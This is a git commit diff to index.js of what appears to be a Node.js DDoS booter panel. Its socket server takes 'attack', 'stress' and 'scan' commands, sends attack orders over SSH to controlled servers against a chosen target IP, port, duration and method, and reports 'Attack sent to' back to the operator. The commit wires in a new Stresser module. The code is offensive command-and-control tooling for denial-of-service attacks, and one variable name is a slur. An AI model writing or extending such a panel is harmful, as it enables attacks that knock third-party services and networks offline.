687a8ad064518ae013eac4cc2084f285dc8157c7
n4no <74839733+Preauthorized@users.noreply.github.com>
2021-05-03 14:32:41 -0400

    Update index.js

--- index.js
+++ index.js
@@ -30,12 +30,16 @@ const ConfigFunc = require("./assets/Config/currentFunctions.js");
 
 const roots = require("./assets/root_system/main.js");
 
+
+// Command Files
+const Stresser = require("./assets/Commands/stresser.js");
+
 /*
 *
 * User connecting
 *
 */
-
+console.clear()
 Server.Server.on('connection', async function(socket) {
     
     console.log('--------------------------------------------');
@@ -93,8 +97,9 @@ Server.Server.on('connection', async function(socket) {
             let lul = roots.SendSSHCmd(Current.CurrentCmd.arg[1], Current.CurrentCmd.arg[2], Current.CurrentCmd.arg[3], Current.CurrentCmd.arg[4])
             socket.write("            Attack sent to: " + Current.CurrentCmd.arg[1] + ":" + Current.CurrentCmd.arg[2] + " for " + Current.CurrentCmd.arg[3] + " seconds with " + Current.CurrentCmd.arg[4] + "\r\n");
         } else if(cleanSTR.startsWith("stress")) {
-            let gay = await Extra.send_attack(Current.CurrentCmd.arg[1], Current.CurrentCmd.arg[2], Current.CurrentCmd.arg[3], Current.CurrentCmd.arg[4], "root");
-            socket.write(gay);
+            Stresser.Stresser(socket);
+            // let gay = await Extra.send_attack(Current.CurrentCmd.arg[1], Current.CurrentCmd.arg[2], Current.CurrentCmd.arg[3], Current.CurrentCmd.arg[4], "root");
+            // socket.write(gay);
         } else if(cleanSTR.startsWith("scan")) {
             socket.write(await Extra.pScan(Current.CurrentCmd.arg[1]));
         } else if(cleanSTR.startsWith("attack")) {
